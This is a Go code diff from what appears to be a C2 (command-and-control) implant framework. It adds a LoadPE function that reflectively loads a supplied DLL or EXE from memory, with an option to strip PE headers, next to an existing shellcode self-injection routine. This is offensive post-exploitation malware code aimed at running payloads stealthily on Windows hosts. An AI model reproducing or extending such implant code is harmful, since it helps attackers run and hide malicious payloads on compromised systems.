@@ -15,6 +15,7 @@ import (
 	"time"
 	"unsafe"
 
+	"github.com/latortuga71/GoC2/pkg/peloader"
 	"github.com/latortuga71/GoC2/pkg/rawapi"
 	"github.com/latortuga71/GoC2/pkg/winapi"
 	"golang.org/x/sys/windows"
@@ -281,4 +282,48 @@ func RawSelfInject(shellcode []byte) (string, error) {
 		return "", err3
 	}
 	return "[+] Success", nil
+}
+
+func LoadPE(shellcode []byte, args []string) (string, error) {
+	if len(args) != 2 {
+		return "", errors.New("Not Enough Args.")
+	}
+	peType := args[0]
+	removeH := args[1]
+	removeHeaders, err := strconv.Atoi(removeH)
+	if err != nil {
+		return "", err
+	}
+	var remove bool
+	if removeHeaders == 1 {
+		remove = true
+	}
+	var t int
+	if peType == "dll" {
+		t = 0
+	} else {
+		t = 1
+	}
+	if peloader.PeType(t) == peloader.Dll {
+		raw := peloader.NewRawPE(peloader.Dll, remove, shellcode)
+		err := raw.LoadPEFromMemory()
+		if err != nil {
+			return "", err
+		}
+		err = raw.FreePeDllFromMemory()
+		if err != nil {
+			return "", err
+		}
+		return "[+] Successfully loaded dll via custom pe loader", nil
+	}
+	raw := peloader.NewRawPE(peloader.Exe, remove, shellcode)
+	err = raw.LoadPEFromMemory()
+	if err != nil {
+		return "", err
+	}
+	err = raw.FreePeFromMemory()
+	if err != nil {
+		return "", err
+	}
+	return "[+] Successfully loaded exe via custom pe loader", nil
 }
